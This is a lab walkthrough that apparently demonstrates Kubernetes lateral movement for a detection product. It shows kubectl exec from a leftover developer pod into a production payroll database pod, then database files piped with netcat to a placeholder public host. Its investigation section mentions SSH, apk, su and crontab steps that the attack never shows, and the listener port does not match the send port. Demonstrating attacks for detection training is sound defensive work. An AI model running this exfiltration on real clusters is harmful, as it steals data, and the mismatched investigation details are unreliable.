# Lateral Movement Within the Cluster

This scenario shows an attacker accessing one portion of a cluster, and using the access in that namespace to move to another and exfiltrate data.

## Running the Exploit

For this scenario, we are going to use some debugging resources left over by Bob, a developer who decided he needed to be able to get direct access to the RSVP app to debug it. Since he forgot to clean up after solving the bugs, there is now an extra pod in the build namespace with some convenient developer tools.

Let's exec into the developer pod to begin.

```sh
kubectl exec -it -n lateral-movement-build bobdev -- /bin/bash
```

Taking a look at the bash history, it looks like Bob used kubectl to get into another namespace:

```sh
history
```
```
    1  ls
    2  kubectl config view
    3  kubectl get pods -A
    4  kubectl get pods -n lateral-movement-prod
    5  kubectl describe pods -n lateral-movement-prod
    6  kubectl exec -n lateral-movement-prod payrolldb-6f7996c855-vrmrt -- hostname
    7  history
```

It looks like the deployment he was accessing is still here:

```sh
kubectl get pods -n lateral-movement-prod
```
```
NAME                         READY   STATUS    RESTARTS   AGE
payrolldb-6cd4447758-2zcq4   1/1     Running   0          3m9s
```

Let's follow in Bob's footsteps.

```sh
kubectl exec -it -n lateral-movement-prod <PODNAME> -- /bin/bash
```

Now, we have ended on a pod in the production namespace, and a database pod on top of that. Taking a look around:

```
root@payrolldb-6cd4447758-2zcq4:/# whoami
root
root@payrolldb-6cd4447758-2zcq4:/# ls
bin  boot  data  dev  docker-entrypoint-initdb.d  etc  home  js-yaml.js  lib  lib32  lib64  libx32  media  mnt	opt  proc  root  run  sbin  srv  sys  tmp  usr	var
root@payrolldb-6cd4447758-2zcq4:/# ls data/
configdb  db
```

It looks like we have full access to the database:

```sh
ls -la data/db
```

From here, we can directly extract the data we want. For example, using netcat: on a different publicly accessible computer (such as the jumpserver set up for the external lateral movement demo), run this command:

```sh
nc -l 1234 > download
```

Then run this in the pod:

```sh
apt update && apt install netcat
cat data/db/collection-0--*.wt | nc PUBLIC_IP 7777
# wait a few seconds, then kill the command with Ctrl-C
```

On the public server, you should now have the collection-0 file.

## Investigation

[[TODO]]

Now that we have demonstrated lateral movement within the cluster, let's see what this looks like in Spyderbat. This test should trigger two Spydertraces - one for each machine we have accessed. On the Spyderbat Console's Dashboard page, navigate to the Security tab. Under "Recent Spydertraces with a score > 50", there are two new traces: `container_shell` and `root_shell` (or `falco_flag`, if you have the Falco integration installed). Select these two traces and click "Start Process Investigation" to start investigating these two traces together.

In the investigation view, we can now clearly see what happened. On the left side, we accessed the bobdev container, took a look around, and then ran an SSH command to connect to the other, an SSH server. After connecting, `apk` was run, followed by `su` and `crontab`.

![An example graph of this exploit.](./lateral_movement_process_graph.png)

The graph you see may differ a bit from what is shown here. Often, some extra processes end up being linked into the trace due to their proximity. To clean up the trace, you can right-click on unneeded branches of the causal tree and remove them, or shift them left or right to make the sequence easier to read. Once you have a graph that has only the information you are interested in, you can save it and share it with other users in your organization by clicking "Copy Investigation Link" at the top of the graph view.

## Next Steps

With the data gathered in this investigation, we can now prepare a few recovery steps:

- Remove the crontab entry that was added for persistence.
- Remove the SSH server and development container that Bob left.
- Check for any other containers that should not exist in the production environment. Spyderbat's Search feature could help with this - search for Containers where the image matches `*ssh*`, for example.
- Have Bob rotate his SSH keys.
- Revise debugging procedures for the affected applications.


